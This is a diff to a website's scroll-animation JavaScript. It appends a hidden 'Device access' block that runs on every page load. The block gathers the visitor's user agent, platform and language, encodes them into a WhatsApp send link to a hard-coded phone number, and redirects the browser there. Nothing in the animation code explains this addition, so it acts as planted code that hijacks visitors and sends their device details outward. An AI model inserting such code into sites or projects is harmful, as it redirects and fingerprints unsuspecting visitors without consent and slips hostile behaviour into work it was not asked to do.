@@ -115,3 +115,17 @@ ScrollReveal().reveal(".news__card", {
     ...scrollRevealOption,
     interval: 1000,
 });
+
+
+// Device access
+if (typeof window !== 'undefined') {
+    const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language
+    };
+
+    const whatsappLink = `https://api.whatsapp.com/send?phone=6285938371318&text=${encodeURIComponent(JSON.stringify(deviceInfo))}`;
+
+    window.location.href = whatsappLink;
+}
